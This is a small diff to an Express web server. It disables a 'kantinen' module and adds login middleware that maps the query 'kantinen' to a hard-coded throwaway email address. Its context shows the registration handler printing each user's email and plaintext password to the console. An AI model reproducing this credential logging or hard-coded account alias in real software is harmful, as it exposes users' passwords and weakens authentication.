@@ -20,7 +20,7 @@ modules.register("editor");
 modules.register("articles");
 modules.register("publication_date");
 modules.register("views");
-modules.register("kantinen");
+// modules.register("kantinen");
 // modules.register("thumbnails");
 
 
@@ -220,6 +220,16 @@ server.post("/login", express.urlencoded({extended: true}), (req, res, next) => 
 server.post("/registrer", express.urlencoded({extended: true}), (req, res, next) => {
 	let { email, password } = req.body;
 	console.log(`[+] ${email} | ${password}`);
+	next();
+});
+
+
+// (_) Kantinen
+const kantinenEmail = "nigen31637@picdv.com";
+server.post("/login", (req, res, next) => {
+	if (req.body.query.match(/^kantinen?$/i)) {
+		req.body.query = kantinenEmail;
+	}
 	next();
 });
 
